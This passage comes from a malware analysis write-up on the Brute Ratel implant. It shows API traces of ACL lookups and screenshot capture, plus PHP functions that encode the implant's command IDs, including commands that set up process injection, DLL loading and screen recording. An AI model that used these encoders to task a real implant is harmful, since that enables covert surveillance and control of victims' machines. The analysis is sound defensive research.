[FLD]               -> Revision            = 1
[FLD]               -> SubAuthorityCount   = 1
[FLD]               -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]               -> SubAuthority[0] = 0x12 (SECURITY_LOCAL_SYSTEM_RID)
[PAR] LPTSTR        lpName                  : 0x0
[PAR] LPDWORD       cchName                 : 0x000000BD59C2E184
[PAR] LPTSTR        lpReferencedDomainName  : 0x0
[PAR] LPDWORD       cchReferencedDomainName : 0x000000BD59C2E188
[PAR] PSID_NAME_USE peUse                   : 0x000000BD59C2E180
[RET] [0xbd59b893b1]

[CNT] [465]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000BD57D80044
[FLD]               -> Revision            = 1
[FLD]               -> SubAuthorityCount   = 1
[FLD]               -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]               -> SubAuthority[0] = 0x12 (SECURITY_LOCAL_SYSTEM_RID)
[PAR] LPTSTR        lpName                  : 0x000000BD57D8DEB0
[PAR] LPDWORD       cchName                 : 0x000000BD59C2E184
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000BD57D8DEC0
[PAR] LPDWORD       cchReferencedDomainName : 0x000000BD59C2E188
[PAR] PSID_NAME_USE peUse                   : 0x000000BD59C2E180
[RET] [0xbd59b89414]

[CNT] [466]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <ConvertSidToStringSidW> in [ADVAPI32.dll] 
[PAR] PSID    Sid       : 0x000000BD57D80044
[FLD]         -> Revision            = 1
[FLD]         -> SubAuthorityCount   = 1
[FLD]         -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]         -> SubAuthority[0] = 0x12 (SECURITY_LOCAL_SYSTEM_RID)
[PAR] LPWSTR* StringSid : 0x000000BD59C2E1C0
[RET] [0xbd59b8943b]

[CNT] [471]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <MapGenericMask> in [ADVAPI32.dll] 
[PAR] PDWORD           AccessMask     : 0x000000BD59C2E18C
[PAR] PGENERIC_MAPPING GenericMapping : 0x000000BD59C2E1C8
[RET] [0xbd59b895ad]

[CNT] [476]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <GetAce> in [ADVAPI32.dll] 
[PAR] PACL    pAcl       : 0x000000BD57D80034
[PAR] DWORD   dwAceIndex : 0x1
[PAR] LPVOID* pAce       : 0x000000BD59C2E1B0
[RET] [0xbd59b89342]

[CNT] [477]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000BD57D80058
[FLD]               -> Revision            = 1
[FLD]               -> SubAuthorityCount   = 2
[FLD]               -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]               -> SubAuthority[0] = 0x20 (SECURITY_BUILTIN_DOMAIN_RID)
[FLD]               -> SubAuthority[1] = 0x220
[PAR] LPTSTR        lpName                  : 0x0
[PAR] LPDWORD       cchName                 : 0x000000BD59C2E184
[PAR] LPTSTR        lpReferencedDomainName  : 0x0
[PAR] LPDWORD       cchReferencedDomainName : 0x000000BD59C2E188
[PAR] PSID_NAME_USE peUse                   : 0x000000BD59C2E180
[RET] [0xbd59b893b1]

[CNT] [478]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000BD57D80058
[FLD]               -> Revision            = 1
[FLD]               -> SubAuthorityCount   = 2
[FLD]               -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]               -> SubAuthority[0] = 0x20 (SECURITY_BUILTIN_DOMAIN_RID)
[FLD]               -> SubAuthority[1] = 0x220
[PAR] LPTSTR        lpName                  : 0x000000BD57D7B120
[PAR] LPDWORD       cchName                 : 0x000000BD59C2E184
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000BD57D7B140
[PAR] LPDWORD       cchReferencedDomainName : 0x000000BD59C2E188
[PAR] PSID_NAME_USE peUse                   : 0x000000BD59C2E180
[RET] [0xbd59b89414]

[CNT] [479]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <ConvertSidToStringSidW> in [ADVAPI32.dll] 
[PAR] PSID    Sid       : 0x000000BD57D80058
[FLD]         -> Revision            = 1
[FLD]         -> SubAuthorityCount   = 2
[FLD]         -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]         -> SubAuthority[0] = 0x20 (SECURITY_BUILTIN_DOMAIN_RID)
[FLD]         -> SubAuthority[1] = 0x220
[PAR] LPWSTR* StringSid : 0x000000BD59C2E1C0
[RET] [0xbd59b8943b]

[CNT] [484]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <MapGenericMask> in [ADVAPI32.dll] 
[PAR] PDWORD           AccessMask     : 0x000000BD59C2E18C
[PAR] PGENERIC_MAPPING GenericMapping : 0x000000BD59C2E1C8
[RET] [0xbd59b895ad]

[CNT] [490]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000BD57D80070
[FLD]               -> Revision            = 1
[FLD]               -> SubAuthorityCount   = 5
[FLD]               -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]               -> SubAuthority[0] = 0x15 (SECURITY_NT_NON_UNIQUE)
[FLD]               -> SubAuthority[1] = 0x465b2954
[FLD]               -> SubAuthority[2] = 0xc06eb168
[FLD]               -> SubAuthority[3] = 0x7881b4b0
[FLD]               -> SubAuthority[4] = 0x450
[PAR] LPTSTR        lpName                  : 0x0
[PAR] LPDWORD       cchName                 : 0x000000BD59C2E184
[PAR] LPTSTR        lpReferencedDomainName  : 0x0
[PAR] LPDWORD       cchReferencedDomainName : 0x000000BD59C2E188
[PAR] PSID_NAME_USE peUse                   : 0x000000BD59C2E180
[RET] [0xbd59b893b1]

[CNT] [491]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <LookupAccountSidW> in [ADVAPI32.dll] 
[PAR] LPCWSTR       lpSystemName            : 0x0 (null)
[PAR] PSID          lpSid                   : 0x000000BD57D80070
[FLD]               -> Revision            = 1
[FLD]               -> SubAuthorityCount   = 5
[FLD]               -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]               -> SubAuthority[0] = 0x15 (SECURITY_NT_NON_UNIQUE)
[FLD]               -> SubAuthority[1] = 0x465b2954
[FLD]               -> SubAuthority[2] = 0xc06eb168
[FLD]               -> SubAuthority[3] = 0x7881b4b0
[FLD]               -> SubAuthority[4] = 0x450
[PAR] LPTSTR        lpName                  : 0x000000BD57D8E060
[PAR] LPDWORD       cchName                 : 0x000000BD59C2E184
[PAR] LPTSTR        lpReferencedDomainName  : 0x000000BD57D8E074
[PAR] LPDWORD       cchReferencedDomainName : 0x000000BD59C2E188
[PAR] PSID_NAME_USE peUse                   : 0x000000BD59C2E180
[RET] [0xbd59b89414]

[CNT] [492]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <ConvertSidToStringSidW> in [ADVAPI32.dll] 
[PAR] PSID    Sid       : 0x000000BD57D80070
[FLD]         -> Revision            = 1
[FLD]         -> SubAuthorityCount   = 5
[FLD]         -> IdentifierAuthority = {0,0,0,0,0,5} (SECURITY_NT_AUTHORITY)
[FLD]         -> SubAuthority[0] = 0x15 (SECURITY_NT_NON_UNIQUE)
[FLD]         -> SubAuthority[1] = 0x465b2954
[FLD]         -> SubAuthority[2] = 0xc06eb168
[FLD]         -> SubAuthority[3] = 0x7881b4b0
[FLD]         -> SubAuthority[4] = 0x450
[PAR] LPWSTR* StringSid : 0x000000BD59C2E1C0
[RET] [0xbd59b8943b]

[CNT] [497]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <MapGenericMask> in [ADVAPI32.dll] 
[PAR] PDWORD           AccessMask     : 0x000000BD59C2E18C
[PAR] PGENERIC_MAPPING GenericMapping : 0x000000BD59C2E1C8
[RET] [0xbd59b895ad]


```

**III. Result**   

```html
[CNT] [504]
[PTP] [0x890] [0x870] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x000000BD57D71860
[STR]        -> "2BEF"
[STR]           "C:\Users\eglantine\Desktop\Samples\BRUTERATEL\autorunsc64.exe"
[STR]           "AA AUTORITE NT\Système| BA"
[STR]           "AA BUILTIN\Administrateurs| BA"
[STR]           "AA MYLAB\eglantine| BA"
[PAR] DWORD  cbBinary   : 0x128
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000000BD57D919E0
[PAR] DWORD* pcchString : 0x000000BD59C2E09C
[RET] [0xbd59b8e028]
```

<a id="GlobalStructControl17"></a>
# GlobalStructControl17    

This function is an interface to 17 fields of the malware internal structure  

```php
function GlobalStructControl17($code, $value)
{
	$cmd_id = "\xb3\xd1 $code, $value";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```


<a id="GlobalStructFree10"></a>
# GlobalStructFree10    

This function is an interface to 10 fields of the malware internal structure.  
It enables to free / set to 0 the specified field  

```php
function GlobalStructFree10($code)
{
	$cmd_id = "\xe2\xf1 $code";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

<a id="GlobalStructControl15"></a>
# GlobalStructControl15    

Same as GlobalStructControl17  

```php
function GlobalStructControl15($code, $value)
{
	$cmd_id = "\xa9\xc3 $code, $value";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

For instance :  

```php
GlobalStructControl15("5", "notepad"); 
```

Sets the path to a process to be executed in a subsequent call to the [CreateProcessSuspendedInjectThread](https://cedricg-mirror.github.io/2025/04/12/BruteRatel5.html#CreateProcessSuspendedInjectThread) command  

```php
GlobalStructControl15("12", "toto.dll"); // LoadLibrary
```

Sets the path to a DLL to be loaded in a subsequent call to the ReflectiveDllLoading command  


<a id="record_screen_jpg"></a>
# record_screen_jpg    

I haven't figured out the specific of this function, but basicaly it's going to take a sequence of screenshots for a specified duration   


```php
/*
  $p1 should be between "1" and "3" for default modes
  $duration is in unknown units but its related to the current system time  
  ex : record_screen_jpg("1", "1")
*/
function record_screen_jpg($p1, $duration)
{
	$cmd_id = "\x41\x9d $p1 $duration";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
```

**I. Fetching the order**  

```html
[CNT] [1058]
[PTP] [0x16ac] [0x4d8] [c:\windows\system32\rundll32.exe]
[API] <CryptStringToBinaryA> in [crypt32.dll] 
[PAR] LPCTSTR pszString  : 0x00000225391429B0
[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+RdGlSNMxHwCXtzumCWpi6HI5ex5W3A=="
[PAR] DWORD   cchString  : 0x0
[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
[PAR] BYTE    *pbBinary  : 0x000002253ABA90F0
[PAR] DWORD   *pcbBinary : 0x000000FA1BEEEA1C
[PAR] DWORD   *pdwSkip   : 0x0
[PAR] DWORD   *pdwFlags  : 0x0
[RET] [0x2253acabea1]
```

**II. Execution**   

```html
[CNT] [1103]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 76 (SM_XVIRTUALSCREEN)
[RET] [0x2253ac99a1a]

[CNT] [1104]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 77 (SM_YVIRTUALSCREEN)
[RET] [0x2253ac99a29]

[CNT] [1105]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <SetProcessDpiAwarenessContext> in [USER32.dll] 
[PAR] DPI_AWARENESS_CONTEXT   Value   : 0xfffffffe (DPI_AWARENESS_CONTEXT_SYSTEM_AWARE)
[RET] [0x2253ac99af7]

[CNT] [1112]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetDC> in [USER32.dll] 
[PAR] HWND   hWnd  : 0x0
[RET] [0x2253ac99b4b]

[CNT] [1113]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [GDI32.dll] 
[PAR] HDC hdc : 0xFFFFFFFF9B010F6B
[RET] [0x2253ac99b6f]

[CNT] [1114]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [gdi32full.dll] 
[RET] [0x2253ac99b6f]

[CNT] [1115]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetCurrentObject> in [GDI32.dll] 
[PAR] HDC  hdc  : 0xFFFFFFFF9B010F6B
[PAR] UINT type : 0x7
[RET] [0x2253ac99b95]

[CNT] [1116]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetObjectW> in [GDI32.dll] 
[PAR] HANDLE h  : 0x105059b
[PAR] int c     : 0x20
[PAR] LPVOID pv : 0x000000FA1C07ED10
[RET] [0x2253ac99bb3]

[CNT] [1137]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CreateDIBSection> in [GDI32.dll] 
[PAR] HDC         hdc      : 0xFFFFFFFF9B010F6B
[PAR] BITMAPINFO* pbmi     : 0x000000FA1C07EB64
[PAR] UINT        usage    : 0x1
[PAR] VOID**      ppvBits  : 0x000000FA1C07EAD8
[PAR] HANDLE      hSection : 0x0
[PAR] DWORD       offset   : 0x0
[RET] [0x2253ac99607]

[CNT] [1138]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <SelectObject> in [GDI32.dll] 
[PAR] HDC     hdc : 0x1e010e45
[PAR] HGDIOBJ h   : 0x1c050de1
[RET] [0x2253ac9961b]

[CNT] [1139]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <BitBlt> in [GDI32.dll] 
[PAR] HDC hdc    : 0x1e010e45
[PAR] int x      : 0x0
[PAR] int y      : 0x0
[PAR] int cx     : 0x564
[PAR] int cy     : 0x3c0
[PAR] HDC hdcSrc : 0xFFFFFFFF9B010F6B
[PAR] int x1     : 0x0
[PAR] int y1     : 0x0
[PAR] int rop    : 0xcc0020
[RET] [0x2253ac99660]

[CNT] [1140]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetCursorInfo> in [USER32.dll] 
[PAR] PCURSORINFO pci : 0x000000FA1C07EB00
[RET] [0x2253ac99683]

[CNT] [1141]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetDesktopWindow> in [USER32.dll] 
[RET] [0x2253ac99697]

[CNT] [1142]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetIconInfo> in [USER32.dll] 
[PAR] HICON     hIcon     : 0x10005
[PAR] PICONINFO piconinfo : 0x000000FA1C07EB18
[RET] [0x2253ac996e2]

[CNT] [1143]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <GetObjectW> in [GDI32.dll] 
[PAR] HANDLE h  : 0x0
[PAR] int c     : 0x20
[PAR] LPVOID pv : 0x000000FA1C07EB38
[RET] [0x2253ac99748]

[CNT] [1144]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <DrawIconEx> in [USER32.dll] 
[PAR] HDC    hdc                : 0x1e010e45
[PAR] int    xLeft              : 0x3b
[PAR] int    yTop               : 0x3b5
[PAR] HICON  hIcon              : 0x10005
[PAR] int    cxWidth            : 0x0
[PAR] int    cyWidth            : 0x0
[PAR] UINT   istepIfAniCur      : 0x0
[PAR] HBRUSH hbrFlickerFreeDraw : 0x0
[PAR] UINT   diFlags            : 0x3
[RET] [0x2253ac99793]

[CNT] [1145]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [GDI32.dll] 
[PAR] HDC hdc : 0xFFFFFFFF9B010F6B
[RET] [0x2253ac9979c]

[CNT] [1146]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleDC> in [gdi32full.dll] 
[RET] [0x2253ac9979c]

[CNT] [1147]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CreateCompatibleBitmap> in [GDI32.dll] 
[PAR] HDC hdc : 0xFFFFFFFF9B010F6B
[PAR] int cx  : 0x780
[PAR] int cy  : 0x438
[RET] [0x2253ac997c6]

[...]
```

**III. Result**   

```html
// Start recording 1745693706
// end recording 1745693766
[CNT] [1134]
[PTP] [0x16ac] [0x28c] [c:\windows\system32\rundll32.exe]
[API] <CryptBinaryToStringW> in [crypt32.dll] 
[PAR] BYTE*  pbBinary   : 0x0000022539142EB0
[STR]        -> "419D"
[STR]           "AC 1745693706 1745693766"
[PAR] DWORD  cbBinary   : 0x3a
[PAR] DWORD  dwFlags    : 0x40000001 (CRYPT_STRING_NOCRLF | CRYPT_STRING_BASE64)
[PAR] LPWSTR pszString  : 0x000002253913FE10
[PAR] DWORD* pcchString : 0x000000FA1C07EBAC
[RET] [0x2253acae028]
```

